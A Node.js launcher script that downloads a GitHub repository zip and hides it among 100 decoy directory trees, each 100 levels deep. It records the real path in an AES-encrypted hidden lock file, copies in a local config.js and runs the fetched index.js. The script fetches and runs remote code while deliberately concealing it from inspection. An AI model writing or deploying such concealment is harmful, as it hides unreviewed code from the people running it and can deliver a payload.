const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

// GitHub zip URL
const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';

// Constants
const CACHE_FOLDER = path.join(__dirname, '.cache');
const LOCK_FILE = path.join(CACHE_FOLDER, '.meta', '.secret.lock');
const SECRET_KEY = crypto.createHash('sha256').update('subzero-super-secret-key').digest(); // 32 bytes
const NUM_ROOTS = 100;
const NEST_DEPTH = 100;

// Encrypt path using AES
function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', SECRET_KEY, iv);
    const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
    return iv.toString('hex') + ':' + encrypted.toString('hex');
}

// Decrypt path
function decrypt(encData) {
    const [ivHex, encryptedHex] = encData.split(':');
    const iv = Buffer.from(ivHex, 'hex');
    const encrypted = Buffer.from(encryptedHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', SECRET_KEY, iv);
    return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString();
}

// Make deep random path
function createDeepPath(base, depth = 100) {
    let current = base;
    for (let i = 0; i < depth; i++) {
        const sub = '.' + crypto.randomBytes(3).toString('hex');
        current = path.join(current, sub);
        fs.mkdirSync(current);
    }
    return current;
}

// Download and extract GitHub repo
async function downloadAndExtractRepo(targetPath) {
    try {
        console.log('[🌐] Downloading repo...');
        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
        const zip = new AdmZip(Buffer.from(response.data, 'binary'));
        zip.extractAllTo(targetPath, true);
        console.log('[✅] Repo extracted.');
    } catch (err) {
        console.error('❌ Could not extract repo:', err);
        process.exit(1);
    }
}

// Remove all dummy paths except the real one
function cleanDummies(excludePath) {
    const allRoots = fs.readdirSync(CACHE_FOLDER).filter(f => f !== '.meta');
    for (const folder of allRoots) {
        const full = path.join(CACHE_FOLDER, folder);
        if (!excludePath.startsWith(full)) {
            fs.rmSync(full, { recursive: true, force: true });
        }
    }
    console.log('[🧹] Dummy folders cleaned');
}

// Main launcher
(async () => {
    let realPath;

    if (fs.existsSync(LOCK_FILE)) {
        const encrypted = fs.readFileSync(LOCK_FILE, 'utf-8');
        realPath = decrypt(encrypted);
        console.log('[🔐] Loaded secure path from encrypted lock');
        cleanDummies(realPath);
    } else {
        if (!fs.existsSync(CACHE_FOLDER)) fs.mkdirSync(CACHE_FOLDER);
        const realIndex = Math.floor(Math.random() * NUM_ROOTS);

        for (let i = 0; i < NUM_ROOTS; i++) {
            const root = path.join(CACHE_FOLDER, '.' + crypto.randomBytes(3).toString('hex'));
            fs.mkdirSync(root);
            const deep = createDeepPath(root, NEST_DEPTH);

            if (i === realIndex) {
                realPath = path.join(deep, '.repo');
                fs.mkdirSync(realPath, { recursive: true });
                await downloadAndExtractRepo(realPath);

                // Save encrypted lock
                const encryptedPath = encrypt(realPath);
                const lockDir = path.dirname(LOCK_FILE);
                fs.mkdirSync(lockDir, { recursive: true });
                fs.writeFileSync(LOCK_FILE, encryptedPath);
                console.log('[🔒] Encrypted path saved to hidden lock');
            } else {
                fs.writeFileSync(path.join(deep, '.dummy'), '❌ fake');
            }
        }
    }

    // Go into the extracted repo
    const extractedFolder = fs.readdirSync(realPath).find(f =>
        fs.statSync(path.join(realPath, f)).isDirectory()
    );

    if (!extractedFolder) {
        console.error('❌ No extracted folder found.');
        process.exit(1);
    }

    const extractedPath = path.join(realPath, extractedFolder);

    // Copy config if exists
    const config = path.join(__dirname, 'config.js');
    if (fs.existsSync(config)) {
        fs.copyFileSync(config, path.join(extractedPath, 'config.js'));
    }

    console.log('[🚀] Running SUBZERO from hidden secure path...');
    process.chdir(extractedPath);
    require(path.join(extractedPath, 'index.js'));
})();
